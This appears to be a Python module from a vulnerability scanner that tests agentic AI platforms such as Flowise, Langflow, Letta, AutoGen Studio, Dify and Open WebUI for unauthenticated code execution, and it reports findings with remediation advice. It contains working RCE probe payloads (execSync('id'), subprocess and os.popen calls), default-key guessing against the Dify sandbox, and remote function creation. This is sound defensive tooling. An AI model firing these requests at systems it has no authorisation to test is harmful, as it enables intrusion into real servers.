"""ASI05 — Unexpected Code Execution: eval/exec sinks in agentic platforms."""
from __future__ import annotations

import time
from urllib.parse import urlparse

import httpx

from .base import BaseModule
from ..core.models import AgentSurface, Finding, OWASPCategory, Severity
from ..platforms.base import BasePlatform


def _is_api_response(r) -> bool:
    """Return False if response is HTML (SPA catch-all), True for JSON/API responses."""
    try:
        ct = r.headers.get("content-type", "")
        if isinstance(ct, str):
            return "text/html" not in ct
    except Exception:
        pass
    return True

# Flowise: node-load-method can execute arbitrary JS code
_FLOWISE_CODE_ENDPOINTS = [
    "/api/v1/node-load-method/jsFunctionNode",
    "/api/v1/node-load-method/ifElseFunction",
    "/api/v1/node-load-method/customFunction",
]

# Active OS command payloads for Flowise (JS)
_JS_OS_PROBE   = {"code": "return require('os').platform()"}
_JS_CMD_PROBE  = {"code": "return require('child_process').execSync('id').toString()"}
# Blind timing probe: if this takes >250ms extra, code executed even without output
_JS_TIMING_PROBE = {"code": "return new Promise(r => setTimeout(() => r(42), 300))"}

_OS_INDICATORS  = ["linux", "darwin", "win32", "freebsd"]
_CMD_INDICATORS = ["uid=", "root", "daemon"]

# AutoGen Studio — FunctionTool endpoint (Shrike-confirmed RCE pattern)
_AUTOGEN_EXEC_ENDPOINTS = [
    "/api/tools/execute",
    "/api/v1/tools/execute",
]
_AUTOGEN_OS_PAYLOAD  = {"source_code": "import os; print(os.getcwd())", "name": "_probe_"}
_AUTOGEN_CMD_PAYLOAD = {
    "source_code": "import subprocess; print(subprocess.check_output(['id']).decode())",
    "name": "_probe_cmd_",
}
_PATH_INDICATORS = ["/", "\\", "home", "root", "tmp", "app", "C:"]

# Langflow — custom component execution
_LANGFLOW_EXEC_ENDPOINTS = [
    "/api/v1/custom_component",
    "/api/v1/run/code",
]
_LANGFLOW_PROBE     = {"code": "print('condor')", "frontend_node": {}}
_LANGFLOW_CMD_PROBE = {
    "code": "import subprocess; print(subprocess.check_output(['id']).decode())",
    "frontend_node": {},
}

# Letta — POST /v1/tools/run — Python exec without auth (GHSA-p67m-xf4h-2r78)
# Root cause: CheckPasswordMiddleware only activates with LETTA_SERVER_SECURE=true (opt-in)
_LETTA_TOOLS_RUN_ENDPOINT = "/v1/tools/run"
_LETTA_RUN_CMD_PAYLOAD = {
    "source_code": "import os\ndef _condor_probe_():\n    return os.popen('id').read()",
    "name": "_condor_probe_",
    "args": {},
}
_LETTA_RUN_PATH_PAYLOAD = {
    "source_code": "import os\ndef _condor_probe_():\n    return os.getcwd()",
    "name": "_condor_probe_",
    "args": {},
}

# Hayhooks — pipeline execution without auth
_HAYHOOKS_RUN_BODY     = {}
_HAYHOOKS_RUN_BODY_ALT = {"data": {}}

# Dify sandbox — code execution service exposed on a dedicated port separate from the API
# In default docker-compose, port 8194 is mapped to the host, bypassing Dify API auth entirely.
_DIFY_SANDBOX_PORT           = 8194
_DIFY_SANDBOX_HEALTH_PATH    = "/health"
_DIFY_SANDBOX_RUN_PATH       = "/v1/sandbox/run"
_DIFY_SANDBOX_HEALTH_MARKER  = "ok"
_DIFY_SANDBOX_DEFAULT_KEYS   = ["dify-sandbox", "sandbox", "dify", ""]
_DIFY_SANDBOX_PROBE_MARKER   = "condor-sandbox-probe"
_DIFY_SANDBOX_PROBE_PAYLOAD  = {
    "language": "python3",
    "code": f'print("{_DIFY_SANDBOX_PROBE_MARKER}")',
    "preload": "",
    "enable_network": False,
}
_DIFY_SANDBOX_OUTPUT_MARKERS = [_DIFY_SANDBOX_PROBE_MARKER]

# Open WebUI — Python function creation (filter/action type, executed on chat events)
_OWI_FUNCTION_ENDPOINT = "/api/v1/functions"
_OWI_FUNCTION_PAYLOAD  = {
    "name": "condor-probe",
    "content": "def filter(body, __user__=None):\n    print('condor')\n    return body",
    "type": "filter",
}


class CodeExecutionModule(BaseModule):
    name        = "code-execution"
    owasp_id    = OWASPCategory.ASI05
    description = "Detects eval/exec sinks and unauthenticated code execution endpoints (ASI05)"

    async def _check_dify_sandbox(self, platform: BasePlatform) -> list[Finding]:
        """Dify sandbox port 8194 exposed directly — bypasses Dify API auth (CWE-306).

        Root cause: docker-compose maps 0.0.0.0:8194:8194, making the code execution
        service reachable before any Dify API authentication check fires.
        """
        parsed = urlparse(platform.base_url)
        sandbox_base = f"{parsed.scheme}://{parsed.hostname}:{_DIFY_SANDBOX_PORT}"
        findings: list[Finding] = []

        # Step 1: health check — is the sandbox port reachable directly?
        try:
            async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
                r = await client.get(f"{sandbox_base}{_DIFY_SANDBOX_HEALTH_PATH}")
                if r.status_code != 200 or _DIFY_SANDBOX_HEALTH_MARKER not in r.text.lower():
                    return findings
                health_text = r.text
        except Exception:
            return findings

        findings.append(Finding(
            title=f"Dify code-execution sandbox accessible on port {_DIFY_SANDBOX_PORT}",
            severity=Severity.HIGH,
            owasp_id=self.owasp_id,
            description=(
                f"The Dify sandbox service (port {_DIFY_SANDBOX_PORT}) is directly reachable "
                f"from the network, bypassing the Dify API authentication layer entirely. "
                f"The sandbox executes arbitrary Python/Node code on behalf of the API server "
                f"and must be isolated to an internal Docker network."
            ),
            evidence=f"GET {sandbox_base}/ → 200 OK: {health_text[:120]}",
            remediation=(
                f"Remove the port {_DIFY_SANDBOX_PORT} mapping from the sandbox container in "
                f"docker-compose.yml. The sandbox must only be reachable by the Dify API "
                f"container via Docker internal networking, never exposed to the host or internet."
            ),
            confidence=90,
            cwe_id="CWE-306",
            endpoint=f"{sandbox_base}/",
        ))

        # Step 2: try code execution with common/default API keys
        try:
            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                for key in _DIFY_SANDBOX_DEFAULT_KEYS:
                    headers = {"X-Api-Key": key} if key else {}
                    try:
                        r2 = await client.post(
                            f"{sandbox_base}{_DIFY_SANDBOX_RUN_PATH}",
                            json=_DIFY_SANDBOX_PROBE_PAYLOAD,
                            headers=headers,
                        )
                        if r2.status_code != 200:
                            continue
                        data = r2.json()
                        if data.get("code") != 0:
                            continue
                        output = data.get("data", {}).get("stdout") or ""
                        if any(m in str(output) for m in _DIFY_SANDBOX_OUTPUT_MARKERS):
                            key_label = repr(key) if key else "(no key)"
                            findings.append(Finding(
                                title=f"Dify sandbox: unauthenticated Python execution via port {_DIFY_SANDBOX_PORT}",
                                severity=Severity.CRITICAL,
                                owasp_id=self.owasp_id,
                                description=(
                                    f"The Dify sandbox on port {_DIFY_SANDBOX_PORT} accepted a "
                                    f"Python execution request with API key {key_label} and "
                                    f"returned command output. An attacker with network access to "
                                    f"this port can execute arbitrary Python code in the sandbox "
                                    f"container without any Dify API authentication."
                                ),
                                evidence=(
                                    f"POST {sandbox_base}/v1/sandbox/run "
                                    f"(X-Api-Key: {key_label}) → code=0, stdout: {str(output)[:200]}"
                                ),
                                remediation=(
                                    f"1. Remove port {_DIFY_SANDBOX_PORT} from docker-compose.yml "
                                    f"port mappings. "
                                    f"2. Set CODE_EXECUTION_API_KEY to a strong random value (≥32 chars). "
                                    f"3. Restrict sandbox network access to Docker internal networks only."
                                ),
                                confidence=98,
                                cwe_id="CWE-306",
                                endpoint=f"{sandbox_base}/v1/sandbox/run",
                            ))
                            break
                    except Exception:
                        pass
        except Exception:
            pass

        return findings

    async def _check_letta_tools_run(self, platform: BasePlatform) -> list[Finding]:
        """Probe Letta /v1/tools/run — arbitrary Python execution without auth (GHSA-p67m-xf4h-2r78)."""
        findings: list[Finding] = []
        try:
            r = await platform.post(_LETTA_TOOLS_RUN_ENDPOINT, json=_LETTA_RUN_CMD_PAYLOAD)
            if r.status_code in (401, 403):
                return findings
            if not _is_api_response(r):
                return findings
            if r.status_code == 200:
                body = r.text
                if any(ind in body for ind in _CMD_INDICATORS):
                    findings.append(Finding(
                        title="Remote code execution confirmed via /v1/tools/run (Letta)",
                        severity=Severity.CRITICAL,
                        owasp_id=self.owasp_id,
                        description=(
                            "Letta's /v1/tools/run endpoint executes arbitrary Python source code "
                            "without authentication. CheckPasswordMiddleware is only active when "
                            "LETTA_SERVER_SECURE=true is set; the default installation is fully open. "
                            "An unauthenticated attacker achieves full server-side code execution."
                        ),
                        evidence=f"POST {_LETTA_TOOLS_RUN_ENDPOINT} with os.popen('id') → 200, command output: {body[:200]}",
                        remediation=(
                            "Set LETTA_SERVER_SECURE=true in the Letta environment. "
                            "Note: LETTA_SERVER_PASS alone has no effect without this flag."
                        ),
                        confidence=98,
                        cwe_id="CWE-94",
                        endpoint=_LETTA_TOOLS_RUN_ENDPOINT,
                    ))
                    return findings

                # Fallback: confirm execution via os.getcwd()
                r2 = await platform.post(_LETTA_TOOLS_RUN_ENDPOINT, json=_LETTA_RUN_PATH_PAYLOAD)
                if r2.status_code in (401, 403):
                    return findings
                if r2.status_code == 200 and _is_api_response(r2):
                    body2 = r2.text
                    path_confirmed = any(ind in body2 for ind in _PATH_INDICATORS)
                    findings.append(Finding(
                        title="Unauthenticated Python execution via /v1/tools/run (Letta)",
                        severity=Severity.CRITICAL,
                        owasp_id=self.owasp_id,
                        description=(
                            "Letta's /v1/tools/run endpoint accepted Python source code without "
                            "authentication. The default configuration does not enforce auth — "
                            "LETTA_SERVER_SECURE=true must be explicitly set."
                        ),
                        evidence=(
                            f"POST {_LETTA_TOOLS_RUN_ENDPOINT} → 200 OK"
                            + (f", path reflected: {body2[:200]}" if path_confirmed else ", code accepted without auth")
                        ),
                        remediation=(
                            "Set LETTA_SERVER_SECURE=true in the Letta environment. "
                            "Note: LETTA_SERVER_PASS alone has no effect without this flag."
                        ),
                        confidence=90 if path_confirmed else 80,
                        cwe_id="CWE-94",
                        endpoint=_LETTA_TOOLS_RUN_ENDPOINT,
                    ))
        except Exception:
            pass
        return findings

    async def _check_hayhooks_pipeline_exec(
        self, surface: AgentSurface, platform: BasePlatform
    ) -> list[Finding]:
        """Probe Hayhooks pipeline run endpoints without authentication (CWE-306)."""
        findings: list[Finding] = []

        # Build pipeline list from enumerated surface first
        pipelines: list[str] = []
        for flow in surface.flows:
            name = flow.get("name") or flow.get("id", "")
            if name:
                pipelines.append(str(name))

        # If the surface was not pre-enumerated, fetch /pipelines directly
        if not pipelines:
            try:
                r = await platform.get("/pipelines")
                if r.status_code == 200 and _is_api_response(r):
                    data = r.json()
                    items = data if isinstance(data, list) else data.get("pipelines", [])
                    for item in items:
                        if isinstance(item, str):
                            pipelines.append(item)
                        elif isinstance(item, dict):
                            name = item.get("name") or item.get("id", "")
                            if name:
                                pipelines.append(str(name))
            except Exception:
                pass

        if not pipelines:
            return findings

        for pipe_name in pipelines[:3]:
            endpoint     = f"/pipelines/{pipe_name}/run"
            alt_endpoint = f"/{pipe_name}/run"
            used_endpoint = endpoint

            try:
                r = await platform.post(endpoint, json=_HAYHOOKS_RUN_BODY)
                # Older Hayhooks served pipelines at /{name}/run directly
                if r.status_code == 404:
                    r = await platform.post(alt_endpoint, json=_HAYHOOKS_RUN_BODY_ALT)
                    used_endpoint = alt_endpoint

                if not _is_api_response(r):
                    continue
                if r.status_code in (401, 403, 404):
                    continue

                evidence_snippet = (r.text or "")[:200]

                if r.status_code in (200, 201, 202):
                    findings.append(Finding(
                        title=f"Unauthenticated pipeline execution via {used_endpoint}",
                        severity=Severity.CRITICAL,
                        owasp_id=self.owasp_id,
                        description=(
                            f"The Hayhooks pipeline '{pipe_name}' can be triggered without "
                            f"authentication. An unauthenticated attacker can run arbitrary "
                            f"Haystack pipelines, including those that read files, call external "
                            f"APIs, or execute arbitrary Python components."
                        ),
                        evidence=f"POST {used_endpoint} → {r.status_code}. Response: {evidence_snippet}",
                        remediation=(
                            "Enable Hayhooks API-key authentication (--auth / HAYHOOKS_SECURITY_* env vars). "
                            "Restrict pipeline execution endpoints to authenticated users."
                        ),
                        confidence=90,
                        cwe_id="CWE-306",
                        endpoint=used_endpoint,
                    ))
                elif r.status_code == 422:
                    findings.append(Finding(
                        title=f"Hayhooks pipeline endpoint accessible without authentication: {used_endpoint}",
                        severity=Severity.HIGH,
                        owasp_id=self.owasp_id,
                        description=(
                            f"The Hayhooks pipeline '{pipe_name}' run endpoint accepted an "
                            f"unauthenticated request and returned HTTP 422 (Unprocessable Entity). "
                            f"Authentication was not enforced — only payload validation failed. "
                            f"A correctly formatted request body may trigger full pipeline execution."
                        ),
                        evidence=f"POST {used_endpoint} → 422 (auth not enforced, payload rejected). Response: {evidence_snippet}",
                        remediation=(
                            "Enable Hayhooks authentication. "
                            "Restrict pipeline execution endpoints to authenticated users."
                        ),
                        confidence=75,
                        cwe_id="CWE-306",
                        endpoint=used_endpoint,
                    ))
            except Exception:
                pass

        return findings

    async def _check_owui_functions(self, platform: BasePlatform) -> list[Finding]:
        """Probe Open WebUI function creation endpoint — Python filter/action execution without auth."""
        findings: list[Finding] = []
        created_id: str | None = None
        try:
            r = await platform.post(_OWI_FUNCTION_ENDPOINT, json=_OWI_FUNCTION_PAYLOAD)
            if r.status_code in (401, 403, 404):
                return findings
            if not _is_api_response(r):
                return findings
            if r.status_code in (200, 201):
                try:
                    data = r.json()
                    created_id = data.get("id") if isinstance(data, dict) else None
                except Exception:
                    pass
                findings.append(Finding(
                    title="Unauthenticated Python function creation accepted: /api/v1/functions",
                    severity=Severity.CRITICAL,
                    owasp_id=self.owasp_id,
                    description=(
                        "Open WebUI's /api/v1/functions endpoint accepted a Python function "
                        "creation request without authentication. Filter and action functions "
                        "are executed server-side on chat events, enabling persistent RCE via "
                        "any authenticated chat interaction."
                    ),
                    evidence=f"POST {_OWI_FUNCTION_ENDPOINT} → {r.status_code} (function created without auth)",
                    remediation=(
                        "Enable Open WebUI authentication (WEBUI_AUTH=True, which is the default). "
                        "Restrict /api/v1/functions to admin users only."
                    ),
                    confidence=95,
                    cwe_id="CWE-306",
                    endpoint=_OWI_FUNCTION_ENDPOINT,
                ))
            elif r.status_code in (400, 422):
                findings.append(Finding(
                    title="Open WebUI function endpoint accessible without authentication",
                    severity=Severity.HIGH,
                    owasp_id=self.owasp_id,
                    description=(
                        "Open WebUI's /api/v1/functions endpoint responded to an unauthenticated "
                        f"POST request (HTTP {r.status_code}). The endpoint allows Python code "
                        "upload; a correctly formatted payload may achieve persistent RCE."
                    ),
                    evidence=f"POST {_OWI_FUNCTION_ENDPOINT} → {r.status_code} (auth not enforced, payload rejected)",
                    remediation="Enable Open WebUI authentication. Restrict function endpoints to admin users.",
                    confidence=70,
                    cwe_id="CWE-306",
                    endpoint=_OWI_FUNCTION_ENDPOINT,
                ))
        except Exception:
            pass
        finally:
            if created_id:
                try:
                    await platform.delete(f"{_OWI_FUNCTION_ENDPOINT}/{created_id}")
                except Exception:
                    pass
        return findings

    async def run(self, surface: AgentSurface, platform: BasePlatform) -> list[Finding]:
        findings: list[Finding] = []

        # Flowise: node-load-method JS execution
        for endpoint in _FLOWISE_CODE_ENDPOINTS:
            try:
                # Try active OS command first
                r = await platform.post(endpoint, json=_JS_CMD_PROBE)
                if r.status_code == 200 and _is_api_response(r):
                    body = r.text
                    cmd_confirmed = any(ind in body for ind in _CMD_INDICATORS)
                    os_confirmed  = any(ind in body.lower() for ind in _OS_INDICATORS)
                    if cmd_confirmed or os_confirmed:
                        findings.append(Finding(
                            title=f"Remote code execution confirmed via {endpoint}",
                            severity=Severity.CRITICAL,
                            owasp_id=self.owasp_id,
                            description=(
                                f"The Flowise endpoint {endpoint} executes arbitrary JavaScript "
                                f"and returned OS command output without authentication."
                            ),
                            evidence=(
                                f"POST {endpoint} with child_process.execSync payload → "
                                f"command output in response: {body[:200]}"
                            ),
                            remediation=(
                                "Enable Flowise authentication (FLOWISE_USERNAME + FLOWISE_PASSWORD). "
                                "Restrict the node-load-method endpoint to authenticated users only."
                            ),
                            confidence=98,
                            cwe_id="CWE-78",
                            endpoint=endpoint,
                        ))
                        continue

                # Fall back to os.platform() probe — only report if output reflected
                r = await platform.post(endpoint, json=_JS_OS_PROBE)
                if r.status_code == 200 and _is_api_response(r):
                    body = r.text
                    confirmed = any(ind in body.lower() for ind in _OS_INDICATORS)
                    if confirmed:
                        findings.append(Finding(
                            title=f"Unauthenticated code execution via {endpoint}",
                            severity=Severity.CRITICAL,
                            owasp_id=self.owasp_id,
                            description=(
                                f"The Flowise endpoint {endpoint} executes arbitrary JavaScript "
                                f"without authentication. An attacker can achieve full server-side "
                                f"code execution, read files, execute system commands, or pivot "
                                f"to internal services."
                            ),
                            evidence=f"POST {endpoint} with JS payload → 200 OK. OS info in response: {body[:200]}",
                            remediation=(
                                "Enable Flowise authentication (FLOWISE_USERNAME + FLOWISE_PASSWORD). "
                                "Restrict the node-load-method endpoint to authenticated users only."
                            ),
                            confidence=95,
                            cwe_id="CWE-77",
                            endpoint=endpoint,
                        ))
                        continue

                # Blind timing probe — warm up first to isolate network latency
                await platform.post(endpoint, json=_JS_OS_PROBE)
                t0 = time.monotonic()
                r = await platform.post(endpoint, json=_JS_TIMING_PROBE)
                elapsed = time.monotonic() - t0
                # Require 250ms above baseline; use 0.5s threshold to avoid false positives
                # from cold TCP connections or server-side scheduling jitter
                if r.status_code == 200 and _is_api_response(r) and elapsed >= 0.5:
                    findings.append(Finding(
                        title=f"Potential blind code execution via timing side-channel: {endpoint}",
                        severity=Severity.HIGH,
                        owasp_id=self.owasp_id,
                        description=(
                            f"The Flowise endpoint {endpoint} accepted a timed async payload "
                            f"and responded after the expected delay ({elapsed:.2f}s), "
                            f"suggesting code executed even though output was not reflected."
                        ),
                        evidence=f"POST {endpoint} with 300ms setTimeout probe → response in {elapsed:.2f}s",
                        remediation="Enable Flowise authentication. Restrict code execution endpoints.",
                        confidence=50,
                        cwe_id="CWE-77",
                        endpoint=endpoint,
                    ))

            except Exception:
                pass

        # AutoGen Studio: tools/execute endpoint (Shrike-confirmed RCE pattern)
        for endpoint in _AUTOGEN_EXEC_ENDPOINTS:
            try:
                # Try active OS command first
                r = await platform.post(endpoint, json=_AUTOGEN_CMD_PAYLOAD)
                if r.status_code in (200, 201) and _is_api_response(r):
                    body = r.text
                    cmd_confirmed = any(ind in body for ind in _CMD_INDICATORS)
                    if cmd_confirmed:
                        findings.append(Finding(
                            title=f"Remote code execution confirmed via {endpoint}",
                            severity=Severity.CRITICAL,
                            owasp_id=self.owasp_id,
                            description=(
                                f"The AutoGen Studio endpoint {endpoint} executed a subprocess "
                                f"command and returned its output without authentication."
                            ),
                            evidence=f"POST {endpoint} with subprocess payload → command output: {body[:200]}",
                            remediation="Enable AutoGen Studio authentication and sandbox code execution.",
                            confidence=98,
                            cwe_id="CWE-78",
                            endpoint=endpoint,
                        ))
                        continue

                # Fall back to os.getcwd() probe
                r = await platform.post(endpoint, json=_AUTOGEN_OS_PAYLOAD)
                if r.status_code in (200, 201) and _is_api_response(r):
                    body = r.text
                    path_confirmed = any(ind in body for ind in _PATH_INDICATORS)
                    findings.append(Finding(
                        title=f"Unauthenticated Python execution via {endpoint}",
                        severity=Severity.CRITICAL,
                        owasp_id=self.owasp_id,
                        description=(
                            f"The AutoGen Studio endpoint {endpoint} accepts Python source code "
                            f"and executes it via exec() without authentication. "
                            f"This allows full server-side code execution."
                        ),
                        evidence=(
                            f"POST {endpoint} with Python payload → {r.status_code}. "
                            + (f"Path in response: {body[:200]}" if path_confirmed else "Endpoint accepted payload.")
                        ),
                        remediation="Enable AutoGen Studio authentication and sandbox code execution.",
                        confidence=95 if path_confirmed else 90,
                        cwe_id="CWE-94",
                        endpoint=endpoint,
                    ))
            except Exception:
                pass

        # Langflow: custom component execution
        for endpoint in _LANGFLOW_EXEC_ENDPOINTS:
            try:
                # Try active OS command first
                r = await platform.post(endpoint, json=_LANGFLOW_CMD_PROBE)
                if r.status_code in (200, 201) and _is_api_response(r):
                    body = r.text
                    cmd_confirmed = any(ind in body for ind in _CMD_INDICATORS)
                    if cmd_confirmed:
                        findings.append(Finding(
                            title=f"Remote code execution confirmed via {endpoint}",
                            severity=Severity.CRITICAL,
                            owasp_id=self.owasp_id,
                            description=(
                                f"The Langflow endpoint {endpoint} executed a subprocess command "
                                f"and returned its output without authentication."
                            ),
                            evidence=f"POST {endpoint} with subprocess payload → command output: {body[:200]}",
                            remediation="Restrict custom component endpoints to authenticated users.",
                            confidence=98,
                            cwe_id="CWE-78",
                            endpoint=endpoint,
                        ))
                        continue

                # Fall back to print('condor') probe
                r = await platform.post(endpoint, json=_LANGFLOW_PROBE)
                if r.status_code in (200, 201) and _is_api_response(r):
                    body = r.text
                    output_confirmed = "condor" in body.lower()
                    findings.append(Finding(
                        title=f"Code execution endpoint reachable: {endpoint}",
                        severity=Severity.HIGH,
                        owasp_id=self.owasp_id,
                        description=(
                            f"The Langflow endpoint {endpoint} is accessible and may allow "
                            f"arbitrary Python execution."
                            + (" Probe output confirmed in response." if output_confirmed else " Requires further manual verification.")
                        ),
                        evidence=f"POST {endpoint} → {r.status_code}" + (f", 'condor' in response" if output_confirmed else ""),
                        remediation="Restrict custom component endpoints to authenticated users.",
                        confidence=85 if output_confirmed else 65,
                        cwe_id="CWE-94",
                        endpoint=endpoint,
                    ))
            except Exception:
                pass

        # Letta: /v1/tools/run — Python exec without auth
        findings.extend(await self._check_letta_tools_run(platform))

        # Open WebUI: Python function creation endpoint
        findings.extend(await self._check_owui_functions(platform))

        # Hayhooks: pipeline execution without auth (CWE-306)
        if surface.platform == "hayhooks":
            findings.extend(await self._check_hayhooks_pipeline_exec(surface, platform))

        # Dify: code execution sandbox port exposed directly
        if surface.platform == "dify":
            findings.extend(await self._check_dify_sandbox(platform))

        return findings
